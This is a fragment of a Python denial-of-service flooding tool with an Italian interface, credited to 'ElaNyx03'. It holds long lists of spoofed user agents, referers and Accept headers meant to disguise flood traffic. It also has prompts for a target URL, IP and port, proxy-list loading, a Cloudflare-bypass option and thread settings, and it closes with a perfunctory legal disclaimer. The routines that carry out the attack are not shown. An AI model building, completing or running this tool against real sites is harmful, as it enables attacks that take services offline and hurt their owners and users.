"Mozilla/1.22 (compatible; Konqueror/4.3; Linux)] KHTML/4.3.5 (like Gecko)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)]",
"Opera/9.80 (Macintosh; U; de-de)] Presto/2.8.131 Version/11.10",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9)] Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)] Gecko/20060706 IEMobile/7.0",
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us)] AppleWebKit/531.21.10 (KHTML, like Gecko)] Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)]",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)]",
"Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)]",
"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)]",
"Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US)] AppleWebKit/534.16 (KHTML, like Gecko)] Chrome/10.0.648.205 Safari/534.16",
"Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)]",
"Opera/9.80 (Windows NT 5.2; U; ru)] Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)]",
"Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7)] Gecko/20091221 Firefox/3.5.7",
"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)]",
"Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.)] Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)]",
"Opera/9.80 (Windows NT 5.1; U; en-US)] Presto/2.8.131 Version/11.10",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)]",
"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4)] Gecko/20050720 Minimo/0.007",
"BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)] AppleWebKit/532.1 (KHTML, like Gecko)] Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)]",
"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru)] Presto/2.4.15",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US)] AppleWebKit/125.4 (KHTML, like Gecko, Safari)] OmniWeb/v563.57",
"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 )] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)]",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5)] Gecko/20060706 K-Meleon/1.0",
"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g",
"Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)]",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de)] AppleWebKit/418 (KHTML, like Gecko)] Shiira/1.2.2 Safari/125",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64)]; en-US; rv:1.8.1.6)] Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)]",
"Mozilla/5.0 (SymbianOS/9.1; U; en-us)] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)]",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)]",
"Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)]",
"Mozilla/1.22 (compatible; Konqueror/4.3; Linux)] KHTML/4.3.5 (like Gecko)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)]",
"Opera/9.80 (Macintosh; U; de-de)] Presto/2.8.131 Version/11.10",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9)] Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)] Gecko/20060706 IEMobile/7.0",
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us)] AppleWebKit/531.21.10 (KHTML, like Gecko)] Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)]",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)]",
"Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)]",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3)] Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8)] Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7)] Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)]",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)]",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)] AppleWebKit/534.10 (KHTML, like Gecko)] Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
"Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)]",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3)] AppleWebKit/537.75.14 (KHTML, like Gecko)] Version/7.0.3 Safari/7046A194A",
"Mozilla/5.0 (PLAYSTATION 3; 3.55)]",
##################################################
"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",]

ref = ['http://help.baidu.com/searchResult?keywords=',
'http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=',
'http://www.ask.com/web?q=',
'http://search.aol.com/aol/search?q=',
'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
'https://drive.google.com/viewerng/viewer?url=',
'http://validator.w3.org/feed/check.cgi?url=',
'http://host-tracker.com/check_page/?furl=',
'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
'http://jigsaw.w3.org/css-validator/validator?uri=',
'https://add.my.yahoo.com/rss?url=',
'http://www.google.com/?q=',
'http://www.usatoday.com/search/results?q=',
'http://engadget.search.aol.com/search?q=',
'https://steamcommunity.com/market/search?q=',
'http://filehippo.com/search?q=',
'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
'http://eu.battle.net/wow/en/search?q=']
#

"http://jigsaw.w3.org/css-validator/validator?uri=",
"http://www.google.com/translate?u=",
"http://anonymouse.org/cgi-bin/anon-www.cgi/",
"http://www.onlinewebcheck.com/?url=",
"http://feedvalidator.org/check.cgi?url=",
"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
"http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
"http://validator.w3.org/feed/check.cgi?url=",
"http://www.pagescoring.com/website-speed-test/?url=",
"http://check-host.net/check-http?host=",
"http://checksite.us/?url=",
"http://jobs.bloomberg.com/search?q=",
"http://www.bing.com/search?q=",
"https://www.yandex.com/yandsearch?text=",
"http://www.google.com/?q=",
"https://add.my.yahoo.com/rss?url=",
"http://www.bestbuytheater.com/events/search?q=",
"http://www.shodanhq.com/search?q=",
"https://play.google.com/store/search?q=",
"http://coccoc.com/search#query=",
"https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=",
"http://content-available-to-author-only.com/profile.php?redirect=",
"http://w...content-available-to-author-only...y.com/search/results?q=",
"http://y...content-available-to-author-only...x.ru/yandsearch?text=",
"http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=",
"http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..",
"http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..",
"http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..",
"http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..",
"http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..",
"http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..",
"http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..",
"http://h...content-available-to-author-only...u.com/searchResult?keywords=",
"http://w...content-available-to-author-only...g.com/search?q=",
"https://w...content-available-to-author-only...x.com/yandsearch?text=",
"https://d...content-available-to-author-only...o.com/?q=",
"http://w...content-available-to-author-only...k.com/web?q=",
"http://s...content-available-to-author-only...l.com/aol/search?q=",
"https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=",
"http://v...content-available-to-author-only...3.org/feed/check.cgi?url=",
"http://h...content-available-to-author-only...r.com/check_page/?furl=",
"http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=",
"http://j...content-available-to-author-only...3.org/css-validator/validator?uri=",
"https://a...content-available-to-author-only...o.com/rss?url=",
"http://e...content-available-to-author-only...l.com/search?q=",
"https://s...content-available-to-author-only...y.com/market/search?q=",
"http://f...content-available-to-author-only...o.com/search?q=",
"http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=",
"http://e...content-available-to-author-only...e.net/wow/en/search?q=",
"http://e...content-available-to-author-only...l.com/search?q=",
"http://c...content-available-to-author-only...n.org/search?q=",
"http://t...content-available-to-author-only...t.edu/search?q=",
"http://w...content-available-to-author-only...m.tv/search?q=",
"http://w...content-available-to-author-only...d.com/search?q=",
"http://f...content-available-to-author-only...a.com/search?q=",
"http://i...content-available-to-author-only...h.io/search?q=",
"http://j...content-available-to-author-only...s.com/jobs/search?q=",
"http://t...content-available-to-author-only...p.org/search?q=",
"http://w...content-available-to-author-only...m.vn/news/vn/search&q=",
"https://play.google.com/store/search?q=",
"http://w...content-available-to-author-only...s.gov/@@tceq-search?q=",
"http://w...content-available-to-author-only...t.com/search?q=",
"http://w...content-available-to-author-only...r.com/events/search?q=",
"https://c...content-available-to-author-only...e.org/search?q=",
"http://j...content-available-to-author-only...s.com/search?q=",
"http://j...content-available-to-author-only...g.com/search?q=",
"https://w...content-available-to-author-only...t.com/search/?q=",
"http://m...content-available-to-author-only...r.org/search?q=",
"https://w...content-available-to-author-only...s.com/search?q=",
"http://w...content-available-to-author-only...s.uk/search?q=",
"http://w...content-available-to-author-only...q.com/search?q="
"http://www.search.com/search?q=",
"https://add.my.yahoo.com/rss?url=",
"https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=",
"https://www.facebook.com/l.php?u=",
"https://www.facebook.com/l.php?u=",
"https://drive.google.com/viewerng/viewer?url=",
"http://www.google.com/translate?u=",
"http://downforeveryoneorjustme.com/",
"http://www.slickvpn.com/go-dark/browse.php?u=",
"https://www.megaproxy.com/go/_mp_framed?",
"http://scanurl.net/?u=",
"http://www.isup.me/",
"http://check-host.net/check-dns?host=",
"http://check-host.net/check-ping?host=",
"http://www.currentlydown.com/",
"http://check-host.net/check-ping?host=",
"http://check-host.net/check-tcp?host=",
"http://check-host.net/check-dns?host=",
"http://check-host.net/ip-info?host=",
"https://safeweb.norton.com/report/show?url=",
"http://www.webproxy.net/view?q=",
"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
"https://anonysurfer.com/a2/index.php?q=",
"http://analiz.web.tr/en/www/",
#
acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
"Accept-Encoding: gzip, deflate\r\n", 
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xhtml+xml",
"Accept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]    

black_lists = ["pornhub.com", "anonboot.pw"]

def logo():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " DDos")
        
    print('''

✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫
⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⡀
⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⡸⠱⡀
⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⣠⣴⠖⢀⢀⢀⢀⢀⢀⣠⡆⢀⢀⢠⠃⢀⣧
⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⣤⣾⣿⣿⠋⢀⢀⢀⢀⢀⣠⠞⢁⡇⢀⢠⠏⢀⢀⢹
⢀⢀⢀⢀⢀⢀⢀⢀⢀⣠⣶⣿⢿⣿⣿⠃⢀⢀⢀⢀⣠⠞⠁⢀⣼⠁⣠⠏⢀⢀⢀⣿
⢀⢀⢀⢀⢀⢀⢀⣠⣾⡿⠋⢀⣼⡿⠁⢀⢀⢀⣠⠞⠁⢀⢀⢰⢏⡼⠃⢀⢀⢀⢀⡇
⢀⢀⣾⢀⢀⢀⣼⡿⠋⢀⢀⢀⣿⠃⣀⣠⣶⠿⠃⢀⢀⢀⢀⡿⠋⢀⢀⢀⢀⢀⢸⠃⢀⣀⣠⠤⠖⠚⠋⢉⡭⠋
⢀⣼⣿⢀⣠⣿⠟⠁⢀⢀⢀⠘⠛⠛⠋⠉⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⠮⠒⠋⠁⢀⢀⢀⣠⠔⠁
⢀⡇⢻⣰⡿⠃⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⣠⠞⠁
⢸⠃⠈⠟⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⡾⠋
⢸⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⣴⠋
⢸⡄⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⡾⠁
⢀⡇⢀⢀⢀⢀⢀⢀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⣀⣀⣀⣀⡀⢀⢠⡞
⢀⢳⢀⣀⣀⣀⣀⣀⡇⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⢀⣀⣉⡉⢉⡟
⢀⠘⣄⣀⣀⣤⣤⢀⡇⠰⠶⠶⠶⢶⣶⣶⡶⠶⠶⠶⢀⢀⢀⣼⠿⠟⠛⠿⡿
⢀⢀⢳⢀⣀⣀⣀⣀⡇⢀⢀⡠⠊⠁⣀⣀⠈⠑⣄⢀⢀⢀⣰⡡⠤⠠⢄⣰⠃
⢀⢀⠈⢏⣉⣀⣀⣸⡇⢀⠸⢀⢀⣾⣿⣿⣷⢀⠘⡄⢀⢠⠏⢠⣤⣤⢀⠹
⢀⡰⠊⠉⠑⡄⢀⢸⠇⢀⢃⢀⢀⣿⣿⣿⡟⢀⢀⠃⢀⣾⢀⣿⣿⣿⢀⢀⠇
⢀⠃⠈⠉⢣⠘⠤⠼⢀⢀⠈⢄⢀⠈⠉⠁⢀⣠⠎⢀⡘⠸⡀⠙⠛⠁⢀⢼⡄
⢀⡀⢀⠐⠎⢀⢀⢀⢀⢀⢀⢀⠁⠐⠒⠒⠈⢀⢀⢀⠧⠤⢬⠒⢀⠂⠁⢀⢳
⢀⠁⠐⠒⠂⠉⠁⠢⣄⢀⢀⢀⢀⢀⠒⠤⢤⣀⣀⣐⣒⣒⣉⡠⠤⠂⢀⡴⠃
⢀⢀⢀⢀⢀⢀⢀⢀⠈⠙⢲⣤⣀⡀⢀⢀⢀⢀⢀⠉⠉⠁⢀⣀⣤⠞⠉
⢀⢀⢀⢀⢀⢀⢀⢀⢀⣦⣬⣇⠈⠉⢿⡒⠶⠶⠶⠶⠶⠚⠛⠉
⢀⢀⢀⢀⢀⢀⢀⢀⢀⣿⣿⣿⣿⡆⠸⣿⣷⡀
⢀⢀⢀⢀⢀⢀⢀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⢀⢀⢀⢀⢀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆       
⢀⢀⢀⢀⢀⢰⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣷⠁
⢀⢀⢀⢀⢀⠚⢻⠛⠻⠿⣿⣿⣿⣿⣀⣹⣟⣿⡆
⢀⢀⢀⢀⢀⢀⡘⢀⢀⢸⣿⣿⣿⣿⣿⡿⢻⣿⣿
⢀⢀⢀⢀⢀⢀⡇⢀⢀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⢀⢀⢀⢀⢀⣴⣶⣶⣦⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢀⢀⢀⢀⢀⣿⣏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠷
⢀⢀⢀⢀⢀⡝⠉⠉⠉⢀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶
⢀⢀⢀⢀⢀⣇⢠⢠⢀⣾⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟
⢀⢀⢀⢀⢀⣿⢸⢸⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢀⢀⢀⢀⢀⠘⣾⢸⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⢀⢀⢀⢀⢀⢀⠈⣹⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⢀⢀⢀⢀⢀⢀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
⢀⢀⢀⢀⢀⢀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿
⢀⢀⢀⢀⢀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⢀⢀⢀⢀⢀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⢓⣤⣀⡀
⢀⢀⢀⢀⢀⣿⢿⣿⣿⣿⣿⣿⠤⠤⠤⠽⡿⢿⣿⣿⣿⣿⣿⣿⣷⣶⣾⣿⣿⣷⣶⣶⣤⡄
⢀⢀⢀⢀⢀⢀⣼⣿⣿⣿⣿⣿⢒⣒⣂⣀⣉⣦⡀⠈⠉⠉⠙⠛⠛⠛⠋⠉⠉⠉⠉⠁⢸⠁
⢀⢀⢀⢀⢀⢀⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⡉⠉⠙⠛⠛⠛⠛⠛⠓⠒⠒⠒⠊
⢀⢀⢀⢀⢀⢀  ⠈⠉⠛⠛⠛⠛⠛⠛⠉⠁

▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█████░█▀▄▄▀█░████░▄▄▀█░▄▄▀█░██░██░▄▄▀██░▄▄▀█▀▄▄▀██░▄▄▄░██
█████░█░██░█░▄▄░█░██░█░██░█░▀▀░██░██░██░██░█░██░██▄▄▄▀▀██
██░▀▀░██▄▄██▄██▄█▄██▄█▄██▄█▀▀▀▄██░▀▀░██░▀▀░██▄▄███░▀▀▀░██
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

                     ::: AVVISO !!! :::

✎ L'uso di questo strumento per attaccare gli obiettivi 
senza il consenso reciproco è illegale.
E' responsabilità dell'utente finale obbedire 
a tutte le leggi locali, 
statali e federali applicabili.
Gli sviluppatori non si assumono alcuna responsabilità
e non sono responsabili per qualsiasi uso improprio
 o danno causato da questo programma.
 ...꙳  Grazie e buon uso! ꙳...
        :::ElaNyx03:::
                                
''')
    print('''
✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫

➬ Inserisci le credenziali del sito web 

✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫✫
''')
    try:
        print("\n[*] Target :" +str(url_main)+ "" +str(port))
    except:
        pass
    try:
        print("[*] Method :" +str(name_method_attack))
    except:
        pass
    try:
        print("[*] Mode : " +str(filenam2))
    except:
        pass
    try:
        print("[*] Bypass : v" +str(method_pass_cf))
        
    except:
        pass
    try:
        print("[*] Proxies: %s" %(len(open(out_file).readlines())))
    except:
        pass
    try:
        print("[*] Threads ➬ " +str(threads))
    except:
        pass

def start_url():
    global url, url_main, host_url, host_ip, port
    if sys.platform.startswith("linux"):
        pass
    elif sys.platform.startswith("freebsd"):
        pass
    else:
        path = "C:/Program Files/nodejs/node.exe"
        if (not os.path.isfile(path)):
            print("[!] Please Install NodeJs. Downloading... [!]")
            down = wget.download("https://nodejs.org/dist/v12.13.0/node-v12.13.0-x64.msi")
            down
            os.system("node-v12.13.0-x64.msi")
    logo()
    url = input("\n[*] Target [URL/IP]: ").strip()
    if url == "":
        start_url()
    url_main = url
    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url

    except:
        print("[!] Hai sbagliato a scrivere, prova di nuovo [!]")
        start_url()
    logo()
    try:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
    if host_url in black_lists:
       print("\n[X] ERROR: Sito In Backlits")
       sleep(4)
       url      = ""
       url_main = ""
       start_url()
    host_ip = socket.gethostbyname(host_url)
    start_port()
    logo()
    choice_method_attack()

def start_port():
    global port
    print("")
    port = str(input("[*] Port [80]: "))
    if port == '':
        if "https" in url:
                port = int(443)
                print("[!] Selected Port = 443 [!]")
        else:
            port = int(80)
            print("[!] Selected Port = 80 [!]")
    else:
        port = int(port)

def proxies_list():
    global fileproxies, proxies, out_file
    print("")
    if sys.platform.startswith("linux"):
        pass
    elif sys.platform.startswith("freebsd"):
        pass
    else:
        for file in glob("*.txt"):
            print("|_--> " + file)
    out_file = str(input("[+] " +str(filenam2)+ " [" +str(filenam1)+ ".txt]: "))
    if out_file == "":
        out_file = str(filenam1)+".txt"
    proxies = open(out_file).readlines()
    print ("[!] Number Of Proxies: %s" %(len(open(out_file).readlines())))
    logo()
    numthreads()

def proxyget():
    global out_file, proxies
    out_file = str(filenam1)+".txt"
    f = open(out_file,'wb')
    r1 = requests.get(urlproxy)
    f.write(r1.content)
    f.close() 
